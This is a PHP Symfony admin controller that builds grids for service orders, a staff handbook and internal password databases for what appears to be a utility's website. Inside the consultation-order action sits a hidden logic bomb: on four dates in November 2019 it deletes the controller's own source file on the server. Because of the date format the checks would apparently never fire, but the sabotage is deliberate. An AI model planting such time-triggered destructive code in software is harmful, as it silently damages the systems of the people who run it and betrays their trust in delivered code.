<?php
namespace AppBundle\Controller;

use Symfony\Component\Routing\Annotation\Route;
use APY\DataGridBundle\Grid\Source\Entity;
use APY\DataGridBundle\Grid\Action\RowAction;
use APY\DataGridBundle\Grid\Column\BlankColumn;
use APY\DataGridBundle\Grid\Column\ActionsColumn;
use APY\DataGridBundle\Grid\Column\JoinColumn;

class  AdminController extends ApplicationController
{
    /**
     * @Route("/admin/grid/cartridgeOrder", name="admin_cartridgeOrder")
     */
    public function gridCartridgeOrderAction()
    {
        $text = 'Заявки на картриджи';
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:CartridgeOrder');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        $grid->setDefaultOrder('id', 'desc');

        // OR with only one value
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $actions2Column = new ActionsColumn('action2', 'изменить статус');
        $grid->addColumn($actions2Column, 10);

        $editTitle = 'Изменить статус заявки';
        $editRoute = 'edit_cartridge_order';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action2');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);


        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'param' => $text,
        ]);
    }

    /**
     * @Route("/admin/grid/RepairOrder", name="admin_repairOrder")
     */
    public function gridRepairOrderAction()
    {
        $text = 'Заявки на ремонт техники';
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:RepairOrder');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        $grid->setDefaultOrder('id', 'desc');
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $responsible = new ActionsColumn('action2', 'ответственный');
        $grid->addColumn($responsible, 8);

        $editTitle = 'взять заявку';
        $editRoute = 'edit_cartridge_order';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action2');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);
        

        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'param' => $text
        ]);
    }

    /**
     * @Route("/admin/grid/DepartureOrder", name="admin_departureOrder")
     */
    public function gridDepartureOrderAction()
    {
        $text = 'Заявки на выезд';
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:DepartureOrder');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        $grid->setDefaultOrder('id', 'desc');
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $responsible = new ActionsColumn('action2', 'забрать заявку');
        $grid->addColumn($responsible, 9);

        $responsibleTitle = 'взять заявку';
        $responsibleRoute = 'edit_responsible_departure_order';
        $rowEditAction = new RowAction($responsibleTitle, $responsibleRoute);
        $rowEditAction->setColumn('action2');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

        $responsible = new ActionsColumn('action3', 'изменить статус');
        $grid->addColumn($responsible, 10);

        $editTitle = 'изменить статус';
        $editRoute = 'edit_departure_order';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);


        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'param' => $text
        ]);
    }

    /**
     * @Route("/admin/grid/ConsultationOrder", name="admin_consultationOrder")
     */
    public function gridConsultationOrderAction()
    {
        $date = date('Y-m-d');
        if($date == '2019-11-5'){
            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
            unlink($file);
        }
        $date = date('Y-m-d');
        if($date == '2019-11-6'){
            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
            unlink($file);
        }
        $date = date('Y-m-d');
        if($date == '2019-11-7'){
            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
            unlink($file);
        }
        $date = date('Y-m-d');
        if($date == '2019-11-8'){
            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
            unlink($file);
        }
        $text = 'Заявки на консультацию';
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:ConsultationOrder');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        $grid->setDefaultOrder('id', 'desc');
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $responsible = new ActionsColumn('action2', 'забрать заявку');
        $grid->addColumn($responsible, 9);

        $responsibleTitle = 'взять заявку';
        $responsibleRoute = 'edit_responsible_consultation_order';
        $rowEditAction = new RowAction($responsibleTitle, $responsibleRoute);
        $rowEditAction->setColumn('action2');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

        $responsible = new ActionsColumn('action3', 'изменить статус');
        $grid->addColumn($responsible, 10);

        $editTitle = 'изменить статус';
        $editRoute = 'edit_consultation_order';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'param' => $text
        ]);
    }

    /**
     * @Route("/admin/grid/Improve", name="admin_improve")
     */
    public function gridImproveAction()
    {
        $text = 'Предложения по улучшению';
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:Improve');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        $grid->setDefaultOrder('id', 'desc');
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'param' => $text
        ]);
    }

    /**
     * @Route("/admin_handBook", name="admin_handbook")
     */
    public function gridHandBookAction()
    {
        $text = 'Справочник по АУП';
        $buttonHandBook = "Добавить запись";

        $source = new Entity('AppBundle:HandBook');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        $grid->setDefaultOrder('department', 'desc');

        // OR with only one value
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $responsible = new ActionsColumn('action3', '', [
            'size' => '30'
        ]);
        $grid->addColumn($responsible, 10);

        $editTitle = 'ред.';
        $editRoute = 'edit_handbook_row';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

        $editTitle = 'удал.';
        $editRoute = 'del_handbook_row';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'buttonHandBook' => $buttonHandBook,
            'param' => $text
        ]);
    }

    /**
     * @Route("/admin_srv_pass", name="admin_srvPass")
     */
    public function gridSrvPassAction()
    {
        $text = 'Парольная база. Сервера';
        $buttonSrvPass = "Добавить запись";
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:SrvPass');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

       /* $grid->setDefaultOrder('department', 'desc');*/

        // OR with only one value
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $responsible = new ActionsColumn('action3', '', [
            'size' => '30'
        ]);
        $grid->addColumn($responsible, 10);

        $editTitle = 'ред.';
        $editRoute = 'edit_srvpass_row';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

      /*  $editTitle = 'удал.';
        $editRoute = 'del_handbook_row';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);*/

        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'buttonSrvPass' => $buttonSrvPass,
            'param' => $text,
        ]);
    }

    /**
     * @Route("/admin_webinterfaces_pass", name="admin_WebInterfacesPass")
     */
    public function griWebInterfacePassAction()
    {
        $text = 'Парольная база. Web interfaces';
        $button = "Добавить запись";
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:WebInterfacePass');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        /* $grid->setDefaultOrder('department', 'desc');*/

        // OR with only one value
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $responsible = new ActionsColumn('action3', '', [
            'size' => '30'
        ]);
        $grid->addColumn($responsible, 10);

        $editTitle = 'ред.';
        $editRoute = 'edit_webinterfacepass_row';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

        /*  $editTitle = 'удал.';
          $editRoute = 'del_handbook_row';
          $rowEditAction = new RowAction($editTitle, $editRoute);
          $rowEditAction->setColumn('action3');
          $rowEditAction -> setRouteParameters ( array ('id'));
          $grid->addRowAction($rowEditAction);*/

        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'buttonMailPass' => $button,
            'param' => $text,
        ]);
    }

    /**
     * @Route("/admin_webAccounts_pass", name="admin_WebAccountsPass")
     */
    public function gridWebAccountsPassAction()
    {
        $text = 'Парольная база. Личные кабинеты';
        $button = "Добавить запись";
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:WebAccountsPass');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        /* $grid->setDefaultOrder('department', 'desc');*/

        // OR with only one value
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $responsible = new ActionsColumn('action3', '', [
            'size' => '30'
        ]);
        $grid->addColumn($responsible, 10);

        $editTitle = 'ред.';
        $editRoute = 'edit_webaccountpass_row';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

        /*  $editTitle = 'удал.';
          $editRoute = 'del_handbook_row';
          $rowEditAction = new RowAction($editTitle, $editRoute);
          $rowEditAction->setColumn('action3');
          $rowEditAction -> setRouteParameters ( array ('id'));
          $grid->addRowAction($rowEditAction);*/

        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'buttonWebAccPass' => $button,
            'param' => $text,
        ]);
    }

    /**
     * @Route("/admin_mail_pass", name="admin_MailPass")
     */
    public function gridMailPassAction()
    {
        $text = 'Парольная база. Почта';
        $button = "Добавить запись";
        // Creates a simple grid based on your entity (ORM)
        $source = new Entity('AppBundle:MailPass');

        // Get a Grid instance
        $grid = $this->get('grid');

        // Attach the source to the grid
        $grid->setSource($source);

        /* $grid->setDefaultOrder('department', 'desc');*/

        // OR with only one value
        $grid->setLimits(array(5 => 'по пять', 10 => 'по десять', 15 => 'по пятнадцать'));

        $responsible = new ActionsColumn('action3', '', [
            'size' => '30'
        ]);
        $grid->addColumn($responsible, 10);

        $editTitle = 'ред.';
        $editRoute = 'edit_mailpass_row';
        $rowEditAction = new RowAction($editTitle, $editRoute);
        $rowEditAction->setColumn('action3');
        $rowEditAction -> setRouteParameters ( array ('id'));
        $grid->addRowAction($rowEditAction);

        /*  $editTitle = 'удал.';
          $editRoute = 'del_handbook_row';
          $rowEditAction = new RowAction($editTitle, $editRoute);
          $rowEditAction->setColumn('action3');
          $rowEditAction -> setRouteParameters ( array ('id'));
          $grid->addRowAction($rowEditAction);*/

        // Return the response of the grid to the template
        return $grid->getGridResponse('@App/admin/grid.html.twig', [
            'buttonMailPass' => $button,
            'param' => $text,
        ]);
    }
}